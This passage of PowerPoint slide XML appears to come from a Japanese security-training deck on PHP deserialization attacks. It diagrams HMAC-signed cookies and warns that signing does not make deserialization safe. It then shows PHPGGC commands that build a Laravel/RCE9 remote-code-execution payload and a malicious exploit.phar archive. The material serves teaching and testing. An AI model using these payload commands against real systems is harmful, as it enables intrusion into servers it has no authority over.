        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4406900" y="1752501"/>
            <a:ext cx="1397000" cy="533400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270782" y="2336701"/>
            <a:ext cx="1669137" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Cookie = value | signature</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 1" descr="connector">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5930900" y="2090936"/>
            <a:ext cx="330200" cy="76200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 2" descr="diamond">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6388100" y="1490266"/>
            <a:ext cx="1397000" cy="889000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6713339" y="2430066"/>
            <a:ext cx="746522" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>署名検証</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HMAC一致？</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4271486" y="3021806"/>
            <a:ext cx="982027" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>NG（不一致）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Image 3" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4000500" y="3263106"/>
            <a:ext cx="1524000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3781425" y="3809206"/>
            <a:ext cx="1962150" cy="532011"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>リクエスト拒否</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>（安全に失敗＝確認できるのはここまで）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7017196" y="3021806"/>
            <a:ext cx="824508" cy="203200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OK（一致）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 4" descr="rect">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId5"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6667500" y="3263106"/>
            <a:ext cx="1524000" cy="482600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6861373" y="3809206"/>
            <a:ext cx="1136253" cy="363141"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>unserialize(value) が</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>実行される地点</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="4572992"/>
            <a:ext cx="10560050" cy="430510"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16962"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E08A3C"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="15" name="Image 5" descr="Warning">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId6"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="984250" y="4699298"/>
            <a:ext cx="177800" cy="177800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1263650" y="4690467"/>
            <a:ext cx="10109200" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>署名は「改ざん検知」であって「デシリアライズの安全性」を保証しない。鍵の強度・管理・署名対象の範囲（アルゴリズム混同など）次第で署名を正しく付け直されるケースがある</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1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7F6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ツール：PHPGGC / PHAR(GGC)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="815975" y="1444625"/>
            <a:ext cx="5187950" cy="4394200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2240"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="1651000"/>
            <a:ext cx="4918456" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHPGGC（PHP Generic Gadget Chains）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="1937941"/>
            <a:ext cx="4918456" cy="444500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>主要PHPフレームワークのベンダーコードから構築済みのガジェットチェーン集。__wakeup()のコマンドインジェクションのような実装固有の脆弱性に頼らずRCE等を狙える</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="2445941"/>
            <a:ext cx="4775200" cy="497681"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12759"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="70301" tIns="70301" rIns="0" bIns="44901" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1260"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>phpggc -l Laravel</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1260"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>phpggc Laravel/RCE9 system '&lt;cmd&gt;' -b</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1022350" y="3032522"/>
            <a:ext cx="4918456" cy="194270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6A7179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Laravel 8.83.25 → RCE9（5.4.0 〜 9.1.8+ 対応）が候補</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6188075" y="1444625"/>
            <a:ext cx="5187950" cy="4394200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2240"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="1651000"/>
            <a:ext cx="4918456" cy="223441"/>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1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>PHAR(GGC)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="1937941"/>
            <a:ext cx="4918456" cy="444500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1650"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>同じガジェットチェーンをシリアライズ済みペイロードではなく、PHARアーカイブ全体として出力。file_exists等での悪用に直結</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="2445941"/>
            <a:ext cx="4775200" cy="497681"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 12759"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="14171A"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="70301" tIns="70301" rIns="0" bIns="44901" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1260"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>phpggc -p phar Laravel/RCE9 \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1260"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="900" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="ECEAE4"/>
                </a:solidFill>
                <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
              </a:rPr>
              <a:t>  system '&lt;cmd&gt;' -o exploit.phar</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="900" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6394450" y="3032522"/>
            <a:ext cx="4775200" cy="464741"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13664"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="70301" tIns="44901" rIns="0" bIns="19501" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1330"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" dirty="0">
